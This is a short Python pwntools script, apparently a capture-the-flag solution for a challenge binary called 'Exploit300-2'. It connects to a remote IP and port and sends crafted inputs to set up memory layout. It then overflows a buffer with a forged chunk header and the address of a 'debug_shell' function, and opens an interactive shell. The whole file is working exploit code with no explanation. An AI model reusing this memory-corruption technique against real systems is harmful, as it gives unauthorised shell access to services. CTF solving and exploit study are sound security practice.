from pwn import *

exe = context.binary = ELF(args.EXE or './Exploit300-2')
io = remote('34.123.210.162', 32017)

io.sendlineafter(b"(or 'done' to finish)",b"a"*0x3f)
io.sendlineafter(b"(or 'done' to finish)",b"b"*0x27)
io.sendlineafter(b"(or 'done' to finish)",b"c"*0x7)
io.sendlineafter(b"(or 'done' to finish)",b"d"*0x7f)
io.sendlineafter(b"(or 'done' to finish)",b"a"*0x3f)
io.sendlineafter(b"(or 'done' to finish)",b"b"*0x27)
io.sendlineafter(b"(or 'done' to finish)",b"c"*0x7)
io.sendlineafter(b"(or 'done' to finish)",b"d"*0x7f)
io.sendlineafter(b"(or 'done' to finish)",b"done")

payload = b"x"*0x40
payload += p64(0) + p64(0x31)
payload += p64(exe.sym.debug_shell)

io.sendlineafter(b"expedition?:",payload)
io.interactive()